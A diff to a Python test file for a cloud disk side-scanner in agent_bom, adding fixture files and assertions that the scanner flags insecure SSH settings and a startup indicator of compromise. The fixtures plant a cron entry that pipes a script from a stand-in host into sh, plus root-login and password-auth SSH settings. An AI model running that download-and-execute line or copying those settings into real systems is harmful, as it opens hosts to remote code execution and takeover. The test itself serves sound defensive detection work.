@@ -26,6 +26,7 @@ from agent_bom.cloud.side_scan import (
     SideScanDisabledError,
     is_sidescan_enabled,
     run_side_scan,
+    scan_workload_disk_findings,
 )
 
 # ── Fakes ─────────────────────────────────────────────────────────────────────
@@ -119,6 +120,10 @@ def debian_rootfs(tmp_path: Path) -> Path:
     (dpkg_dir / "status").write_text("Package: libssl3\nStatus: install ok installed\nVersion: 3.0.11-1\nSource: openssl\n\n")
     # Planted credential so the secret scanner has something to redact.
     (root / "app.env").write_text("AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLEDEADBEEFCAFE1234\n")
+    (root / "etc" / "ssh").mkdir(parents=True)
+    (root / "etc" / "ssh" / "sshd_config").write_text("PermitRootLogin yes\nPasswordAuthentication yes\n")
+    (root / "etc" / "cron.d").mkdir(parents=True)
+    (root / "etc" / "cron.d" / "bootstrap").write_text("curl https://example.invalid/bootstrap.sh | sh\n")
     return root
 
 
@@ -194,6 +199,23 @@ class TestFullLifecycle:
         assert result.snapshot_id == "snap-1"
         # Native parser found the deb package off the mounted fixture.
         assert any(p.name == "libssl3" for p in result.packages)
+        assert {finding.finding_type for finding in result.config_findings} == {
+            "ssh_password_auth_enabled",
+            "ssh_root_login_enabled",
+        }
+        assert [finding.finding_type for finding in result.ioc_findings] == ["download_execute_startup"]
+        payload = result.to_dict()
+        assert payload["config_finding_count"] == 2
+        assert payload["ioc_finding_count"] == 1
+        assert "bootstrap.sh" not in str(payload["ioc_findings"])
+
+    def test_workload_disk_findings_are_metadata_only(self, debian_rootfs: Path) -> None:
+        config_findings, ioc_findings = scan_workload_disk_findings(debian_rootfs)
+
+        assert len(config_findings) == 2
+        assert len(ioc_findings) == 1
+        assert all("PermitRootLogin yes" not in finding.to_dict().values() for finding in config_findings)
+        assert all("curl https://example.invalid" not in finding.to_dict().values() for finding in ioc_findings)
 
     @pytest.mark.asyncio
     async def test_delete_snapshot_targets_created_snapshot(
